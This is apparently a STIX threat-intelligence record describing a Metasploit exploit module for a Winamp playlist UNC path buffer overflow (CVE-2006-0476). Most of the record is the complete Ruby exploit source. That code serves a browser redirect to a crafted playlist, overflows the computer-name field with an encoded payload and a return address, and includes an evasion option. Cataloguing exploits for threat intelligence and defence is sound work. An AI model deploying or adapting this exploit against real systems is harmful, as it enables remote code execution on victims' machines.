{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4593e231-1b71-481b-bfb6-03501a70cbc1",
    "created": "2024-08-14T16:43:28.877723Z",
    "modified": "2024-08-14T16:43:28.877727Z",
    "name": "Winamp Playlist UNC Path Computer Name Overflow",
    "description": " This module exploits a vulnerability in the Winamp media player. This flaw is triggered when an audio file path is specified, inside a playlist, that consists of a UNC path with a long computer name. This module delivers the playlist via the browser. This module has only been successfully tested on Winamp 5.11 and 5.12.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/winamp_playlist_unc.rb",
            "external_id": "winamp_playlist_unc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-0476"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  #\n  # This module acts as an HTTP server\n  #\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Winamp Playlist UNC Path Computer Name Overflow',\n      'Description'    => %q{\n          This module exploits a vulnerability in the Winamp media player.\n        This flaw is triggered when an audio file path is specified, inside a\n        playlist, that consists of a UNC path with a long computer name. This\n        module delivers the playlist via the browser. This module has only\n        been successfully tested on Winamp 5.11 and 5.12.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'hdm',\n          'Faithless <rhyskidd[at]gmail.com>'\n        ],\n      'References'     =>\n        [\n          ['CVE', '2006-0476'],\n          ['OSVDB', '22789'],\n          ['BID', '16410'],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 526,\n          'BadChars' => \"\\x00\\x5c\\x2f\\x0a\\x0d\\x20\",\n          'Compat'   =>\n            {\n              'ConnectionType' => '-find',\n            },\n\n          # Landing on \\x5c\\x5c trashes esp, restore from ecx\n          'PrependEncoder' => \"\\x87\\xe1\",\n          'StackAdjustment' => -3500,\n\n          # Dont need them, dont want them, preserve esi\n          'DisableNops' => true,\n\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Return to exe, but don't clobber ecx, 0x0d is replaced by 0x00\n          [ 'Winamp 5.12 Universal', { 'Ret' => 0x0d45fece }],\n        ],\n      'DisclosureDate' => '2006-01-29',\n      'DefaultTarget'  => 0))\n\n    register_evasion_options(\n      [\n        OptBool.new('PlaylistSpaceInjection', [false, 'Add junk spaces in between each entry item in the playlist\"', false])\n      ])\n  end\n\n  def on_request_uri(cli, request)\n\n    if (not request.uri.match(/\\.pls$/i))\n      if (\"/\" == get_resource[-1,1])\n        pls_uri = get_resource[0, get_resource.length - 1]\n      else\n        pls_uri = get_resource\n      end\n      pls_uri << \"/\" + rand_text_alphanumeric(rand(80)+16) + \".pls\"\n      html =\n        \"<html><body>\"+\n        \"<script>\" +\n        \"document.location='#{pls_uri}'</script>\" +\n        \"One second please...</body></html>\"\n      send_response_html(cli, html)\n      return\n    end\n\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the compressed response to the client\n    send_response(cli, generate_playlist(p), { 'Content-Type' => 'text/plain' })\n\n    # Handle the payload\n    handler(cli)\n  end\n\n  def generate_playlist(payload)\n\n    pcnt = rand(10)+10;\n\n    file = rand_text_english(1026)\n    file[1022  , 4] = [target.ret].pack('V')\n    file[0, payload.encoded.length] = payload.encoded\n\n    play =\n      \"[playlist]\\r\\n\"                 +\n        generate_songs(pcnt)         +\n        generate_song(pcnt + 1, \"\\\\\\\\#{file}\") +\n        generate_line('NumberOfEntries', \"#{pcnt+1}\") +\n        generate_line('Version', '2')\n    return play\n  end\n\n  def generate_space\n    if datastore['PlaylistSpaceInjection']\n      return rand_text(rand(100)+1, nil, \" \\t\")\n    else\n      return ''\n    end\n  end\n\n  def generate_song(id, file)\n    return generate_line(\"File#{id}\", file) +\n        generate_line(\"Title#{id}\", rand_text_alphanumeric(rand(64)+1)) +\n        generate_line(\"Length#{id}\", \"%x\" % (rand(1024) + 30))\n  end\n\n  def generate_line(key, value)\n    return generate_space + key + generate_space + '=' + generate_space + value + generate_space + \"\\r\\n\"\n  end\n\n  def generate_songs(cnt)\n    songs = ''\n    1.upto(cnt) do |i|\n      songs << generate_song(i, rand_text_alphanumeric(rand(64)+1))\n    end\n    return songs\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-01-29",
    "x_mitre_platforms": [
        "win'"
    ]
}